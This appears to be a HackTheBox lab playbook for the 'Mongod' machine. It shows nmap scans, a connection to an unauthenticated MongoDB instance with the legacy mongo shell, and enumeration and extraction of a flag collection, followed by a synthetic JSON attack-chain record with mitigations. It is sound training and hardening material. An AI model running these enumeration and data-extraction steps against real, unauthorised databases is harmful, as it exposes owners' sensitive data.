# HTB Mongod - MongoDB Misconfiguration Playbook

Target theme:
- Database exposure
- Anonymous/unauthenticated MongoDB access
- Sensitive data extraction from open instance

Use only in authorized lab scope.

---

## 1. Objective

1. identify exposed MongoDB service,
2. validate authentication posture,
3. enumerate databases and collections,
4. extract target artifact and assess impact.

---

## 2. Network Enumeration

Standard scan:

```bash
nmap -sC -sV <TARGET_IP>
```

Full-port scan for missed services:

```bash
nmap -Pn -sC -sV -p- <TARGET_IP>
```

Expected key service:
- 27017/tcp MongoDB

---

## 3. Mongo Shell Access

Some HTB targets are easier with legacy mongo shell client.

If required:

```bash
wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.6.23.tgz
tar -xvzf mongodb-linux-x86_64-3.6.23.tgz
cd mongodb-linux-x86_64-3.6.23/bin
./mongo <TARGET_IP>:27017
```

If connection succeeds without credentials, this indicates severe auth misconfiguration.

---

## 4. MongoDB Enumeration Commands

Inside mongo shell:

```javascript
show dbs
use sensitive_information
show collections
db.flag.find().pretty()
```

Expected structure in this lab:
- databases include admin, config, local, sensitive_information, users
- sensitive_information contains collection flag

---

## 5. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -Pn -sC -sV -p- 10.129.146.47
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.x
27017/tcp open  mongodb MongoDB 3.6.x

analyst@kali:~$ ./mongo 10.129.146.47:27017
MongoDB shell version v3.6.23
connecting to: mongodb://10.129.146.47:27017/
MongoDB server version: 3.6.8

> show dbs
admin                 0.000GB
config                0.000GB
local                 0.000GB
sensitive_information 0.000GB
users                 0.000GB

> use sensitive_information
switched to db sensitive_information

> show collections
flag

> db.flag.find().pretty()
{
	"_id" : ObjectId("..."),
	"flag" : "HTB{...flag...}"
}
```

---

## 6. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "mongod_unauthenticated_db_access",
	"input_signals": [
		"MongoDB exposed on 27017/tcp",
		"Database access granted without authentication",
		"Sensitive database and flag collection readable"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Service Discovery",
			"confidence": 0.96,
			"evidence": "nmap detected MongoDB service"
		},
		{
			"step": 2,
			"tactic": "initial_access",
			"technique": "Exposed Public-Facing Service Misconfiguration",
			"confidence": 0.95,
			"evidence": "mongo shell connected without auth"
		},
		{
			"step": 3,
			"tactic": "collection",
			"technique": "Data from Information Repositories",
			"confidence": 0.93,
			"evidence": "db.flag.find().pretty() returned sensitive record"
		}
	],
	"hypotheses": [
		"Additional collections may contain credentials/API tokens",
		"Same host may expose other unauthenticated data services",
		"Database user model may be globally disabled"
	],
	"uncertainties": [
		"Write permissions and destructive capability not validated",
		"Replication peers and cluster scope unknown",
		"No evidence of access logging or anomaly detection"
	],
	"tool_calls": [
		{"name": "mongo_schema_mapper", "priority": "high"},
		{"name": "mongo_auth_posture_check", "priority": "high"},
		{"name": "secret_exposure_classifier", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Enable MongoDB authentication and create least-privilege users",
			"Restrict 27017 access to trusted internal hosts only",
			"Rotate any exposed secrets present in collections"
		],
		"hardening": [
			"Bind MongoDB to localhost/private interface",
			"Enable TLS for client and inter-node communications",
			"Apply role-based access control and deny unauthenticated reads"
		],
		"monitoring": [
			"Alert on external connections to 27017",
			"Track unusual full-collection read patterns",
			"Enable and review MongoDB audit logs"
		]
	}
}
```